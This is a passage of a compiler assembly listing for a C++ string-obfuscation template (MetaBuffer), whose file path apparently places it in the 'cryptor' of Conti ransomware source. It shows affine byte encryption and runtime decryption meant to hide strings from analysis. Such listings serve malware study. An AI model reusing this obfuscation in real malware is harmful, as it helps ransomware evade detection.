; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001dd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv168[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001e3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001ea	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001f1	5f		 pop	 rdi
  001f2	5d		 pop	 rbp
  001f3	c3		 ret	 0
??0?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 2d	 sub	 eax, 45			; 0000002dH
  0002d	6b c0 c1	 imul	 eax, eax, -63		; ffffffffffffffc1H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	8d 44 00 2d	 lea	 eax, DWORD PTR [rax+rax+45]
  0002e	99		 cdq
  0002f	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00034	f7 f9		 idiv	 ecx
  00036	8b c2		 mov	 eax, edx

; 76   :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 06	 cmp	 QWORD PTR i$1[rbp], 6
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv140 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00131	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00135	88 85 c0 00 00
	00		 mov	 BYTE PTR tv140[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0013b	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00142	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00149	5f		 pop	 rdi
  0014a	5d		 pop	 rbp
  0014b	c3		 ret	 0
??0?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
